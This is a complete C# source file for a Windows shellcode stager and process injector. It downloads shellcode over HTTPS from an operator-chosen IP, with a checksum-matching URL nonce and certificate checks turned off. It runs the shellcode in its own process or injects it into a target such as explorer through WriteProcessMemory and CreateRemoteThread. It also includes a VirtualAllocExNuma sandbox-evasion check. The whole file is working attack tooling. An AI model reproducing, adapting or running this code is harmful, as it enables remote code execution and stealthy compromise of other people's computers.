using System;
using System.Diagnostics;
using System.Net;
using System.Runtime.InteropServices;

public class Program
{
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, ref IntPtr lpThreadId);

    [DllImport("kernel32.dll")]
    static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

    [DllImport("kernel32.dll")]
    static extern IntPtr GetCurrentProcess();

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

    [DllImport("kernel32.dll")]
    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, ref IntPtr lpThreadId);

    private static UInt32 MEM_COMMIT = 0x1000;
    private static UInt32 MEM_COMMIT_RESERVE = 0x3000;
    private static UInt32 PAGE_READWRITE = 0x4;
    private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;

    private static char[] d = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".ToCharArray();


    public static void Main(string[] args)
    {

        IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, MEM_COMMIT_RESERVE, 0x3000, PAGE_READWRITE, 0);
        if (mem == null)
        {
            return;
        }

        string mode = "run"; // Default
        string ip = null;
        string port = null;
        string program = null;
        int pid = 0;
        Process[] expProc;

        for (int i = 0; i < args.Length; i++)
        {
            switch (args[i])
            {
                case "-i":
                case "--ip":
                    if (i + 1 < args.Length)
                    {
                        ip = args[++i];
                    }
                    break;

                case "-p":
                case "--port":
                    if (i + 1 < args.Length)
                    {
                        port = args[++i];
                    }
                    break;

                case "-P":
                case "--program":
                    if (i + 1 < args.Length)
                    {
                        program = args[++i];
                    }
                    break;

                case "-d":
                case "--pid":
                    if (i + 1 < args.Length)
                    {
                        pid = Int32.Parse(args[++i]);
                    }
                    break;

                default:
                    mode = args[i];
                    break;
            }
        }

        if (string.IsNullOrEmpty(ip) || string.IsNullOrEmpty(port))
        {
            print_help();
            return;
        }

        if (string.IsNullOrEmpty(mode) || (mode == "inject" && string.IsNullOrEmpty(program) && pid == 0))
        {
            print_help();
            return;
        }

        string processName = "";

        switch (mode)
        {
            case "run":
                pid = Process.GetCurrentProcess().Id;
                break;
            case "inject":
                if (pid == 0)
                {
                    processName = program;
                }
                break;
            default:
                print_help();
                return;
        }

        if (!string.IsNullOrEmpty(processName))
        {
            expProc = Process.GetProcessesByName(processName);

            if (expProc.Length > 0)
            {
                pid = expProc[0].Id;
            }
            else
            {
                Console.WriteLine($"Process {processName} not found, defaulting to 'run' mode.");
                pid = Process.GetCurrentProcess().Id;
            }
        }



        string nonce = G();
        Console.WriteLine(String.Format("[+] Nonce Found! {0}", nonce));

        string url = String.Format("https://{0}:{1}/{2}", ip, port, nonce);
        Console.WriteLine(String.Format("[+] Final URL: {0}", url));
        byte[] shellcode = Stager(url);

        IntPtr handle = Runner(shellcode, pid);

        if (pid == Process.GetCurrentProcess().Id)
        {
            WaitForSingleObject(handle, 0xFFFFFFFF);
        }


    }

    public static bool C(string v)
    {
        int sum = 0;
        foreach (int c in v.ToCharArray())
        {
            sum += c;
        }
        return sum % 256 == 92;
    }

    public static void E(ref char[] x)
    {
        Random rnd = new Random();
        int n = x.Length;
        while (n > 1)
        {
            int q = rnd.Next(n--);
            char y = x[n];
            x[n] = x[q];
            x[q] = y;
        }
    }

    public static string T()
    {
        Random rnd = new Random();
        string f = "";
        for (int i = 1; i < 57; i++)
        {
            f += d[rnd.Next(d.Length)];
        }
        return f;
    }

    public static string G()
    {
        for (int i = 0; i < 64; i++)
        {
            string h = T();
            char[] k = d;
            E(ref k);
            foreach (char l in k)
            {
                string s = h + l;
                if (C(s))
                {
                    return s;
                }
            }
        }
        return "nD7qcbYj8eZVilSICKHiKQ5d9UJt8wcsY3KVBWrtBEvK9mbfbWNqZ9sf1";
    }

    // Find the nonce in the URL and load the shellcode


    public static void print_help()
    {
        Console.WriteLine("Usage:");
        Console.WriteLine("\tmyprogram.exe mode [options]");
        Console.WriteLine();
        Console.WriteLine("Modes:");
        Console.WriteLine("\trun");
        Console.WriteLine("\tinject");
        Console.WriteLine();
        Console.WriteLine("Options:");
        Console.WriteLine("\t-i, --ip \tIP address");
        Console.WriteLine("\t-p, --port \tPort number");
        Console.WriteLine("\t-P, --program \tProgram name (for 'inject' mode)");
        Console.WriteLine("\t-d, --pid \tProcess ID (for 'inject' mode)");
        Console.WriteLine();
        Console.WriteLine("Example:");
        Console.WriteLine("\tmyprogram.exe inject -i 192.168.0.1 -p 443 -P explorer");
        Console.WriteLine("\tmyprogram.exe inject -i 192.168.0.1 -p 443 -d 1234");
    }



    public static byte[] Stager(string url)
    {

        WebClient client = new WebClient();
        client.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36");
        ServicePointManager.Expect100Continue = true;
        ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
        ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };

        Console.WriteLine("[+] Beginning download.");
        byte[] shellcode = client.DownloadData(url);

        Console.WriteLine("[+] Download complete!");
        return shellcode;


    }

    public static IntPtr Runner(byte[] shellcode, int pid)
    {
        IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
        IntPtr addr = VirtualAllocExNuma(hProcess, IntPtr.Zero, (UInt32)shellcode.Length, MEM_COMMIT_RESERVE, PAGE_EXECUTE_READWRITE, 0);
        IntPtr outSize;
        WriteProcessMemory(hProcess, addr, shellcode, shellcode.Length, out outSize);
        IntPtr threadHandle = IntPtr.Zero;
        IntPtr threadId = IntPtr.Zero;
        IntPtr parameter = IntPtr.Zero;
        Console.WriteLine("[+] Executing.");
        threadHandle = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, parameter, 0, ref threadId);
        return threadHandle;
    }
}